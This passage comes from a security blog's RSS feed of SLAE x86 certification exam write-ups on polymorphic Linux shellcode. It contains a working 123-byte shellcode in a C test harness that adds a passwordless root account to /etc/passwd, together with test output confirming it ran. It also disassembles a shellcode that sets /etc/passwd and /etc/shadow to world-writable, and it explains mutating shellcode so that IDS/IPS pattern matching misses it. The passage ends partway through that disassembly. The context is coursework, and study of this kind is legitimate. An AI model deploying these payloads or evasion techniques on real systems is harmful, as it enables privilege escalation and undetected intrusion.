&lt;p&gt;It terminates the execution. I chose not to clear &lt;code&gt;EAX&lt;/code&gt; in order to save more bytes, but since this polymorphic version is simply &lt;code&gt;115%&lt;/code&gt; bigger than the original size, you can just add a &lt;code&gt;xor eax, eax&lt;/code&gt; before the &lt;code&gt;inc eax&lt;/code&gt;, since it required only &lt;code&gt;1 byte&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;testing&quot;&gt;Testing&lt;/h3&gt;
&lt;p&gt;To test the polymorphic shellcode, I've used the following C program:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; \
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode length: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To compile:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; test_polymorphic_shellcode test_polymorphic_shellcode.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once I've run it, I could see a new entry inside the file &lt;code&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rbct@slae:~/exam/assignment_6/2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 3 /etc/passwd
&lt;span class=&quot;c&quot;&gt;# landscape:x:104:109::/var/lib/landscape:/bin/false&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash&lt;/span&gt;

rbct@slae:~/exam/assignment_6/2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; ./shellcode_template 
&lt;span class=&quot;c&quot;&gt;# Shellcode length: 123&lt;/span&gt;

rbct@slae:~/exam/assignment_6/2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 3 /etc/passwd
&lt;span class=&quot;c&quot;&gt;# sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# toor::0:0:t00r:/root:/bin/bash&lt;/span&gt;

rbct@slae:~/exam/assignment_6/2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Tue, 04 Jan 2022 00:00:00 +0100</pubDate>
        <link>/22/01/04/slae32-assignment-6_2</link>
        <guid isPermaLink="true">/22/01/04/slae32-assignment-6_2</guid>
        
        <category>slae</category>
        
        <category>x86</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>polymorphism</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #6 Part 1</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 6th assignment requires you to analyze 3 shellcodes from &lt;a href=&quot;http://shell-storm.org/shellcode/&quot;&gt;Shell-Storm&lt;/a&gt; and &amp;quot;create polymorphic versions of them to beat pattern matching&amp;quot;.&lt;/p&gt;
&lt;p&gt;There's only 1 constraint:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The polymorphic versions cannot be larger 150% of the existing shellcode&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I chose the following shellcodes:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-812.php&quot;&gt;Linux/x86 - chmod 666 /etc/passwd &amp;amp; /etc/shadow - 57 bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-222.php&quot;&gt;Linux/x86 - setuid(0) setgid(0) execve(echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space) - 79 bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-825.php&quot;&gt;Linux/x86 - iptables --flush - 43 bytes&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In this part I'll create a polymorphic version of the 1st shellcode.&lt;/p&gt;
&lt;h2 id=&quot;source-code&quot;&gt;Source code&lt;/h2&gt;
&lt;p&gt;The files for this part of the assignment are the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/original_shellcode.nasm&quot;&gt;original_shellcode.nasm&lt;/a&gt;, contains the original shellcode of which I wrote a polymorphic version&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_stable.nasm&quot;&gt;polymorphic_stable.nasm&lt;/a&gt;, contains the polymorphic version of the shellcode, but with a few more checks in order to avoid segmentation faults&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_tiny.nasm&quot;&gt;polymorphic_tiny.nasm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/test_polymorphic_stable.c&quot;&gt;test_polymorphic_stable.c&lt;/a&gt;, a C program for testing the polymorphic shellcode (&lt;code&gt;polymorphic_stable.nasm&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;definitions&quot;&gt;Definitions&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;What is &lt;strong&gt;Polymorphism&lt;/strong&gt;?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Polymorphism refers to the ability of something (e.g. shellcode, malwares) to mutate, while keeping intact the original code. For example, to clear a register you can use the following instruction:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;However, there are many more possibilities, like these:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; mov-xor&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;; push-dec-pop&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;; mov-sub&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xaabbccdd&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xaabbccdd&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In the case of shellcodes and malwares, the objective is to hide their presence from Security Protections that use &lt;strong&gt;Pattern Matching&lt;/strong&gt;, such as &lt;code&gt;IDS&lt;/code&gt; and &lt;code&gt;IPS&lt;/code&gt; systems.&lt;/p&gt;
&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;First, here's the original shellcode in &lt;strong&gt;Intel syntax&lt;/strong&gt;, since the shellcode on the original page uses &lt;strong&gt;AT&amp;amp;T syntax&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shellcode.bin

ndisasm &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; EAX 0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; ECX = 110110110&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; u=rw, g=rw, o=rw&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B9B601&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1b6&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; &quot;/etc//passwd&quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000006&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;50&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000007&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6873737764&lt;/span&gt;        &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64777373&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F2F7061&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61702f2f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000011&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F657463&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6374652f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; EBX = pointer to &quot;/etc//passwd&quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000016&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; chmod(EBX, ECX)&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; ECX = permissions u=rw, g=rw, o=rw&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000018&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B00F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;First it runs the instruction &lt;code&gt;chmod(&amp;quot;/etc//passwd&amp;quot;, 0666)&lt;/code&gt; to change the permissions over &lt;code&gt;/etc/passwd&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; EAX = 0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; &quot;/etc//shadow&quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6861646&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F77&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x776f6461&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000024&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F2F7368&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f2f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000029&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F657463&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6374652f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; EBX = pointer to &quot;/etc//shadow&quot;&lt;/span&gt;
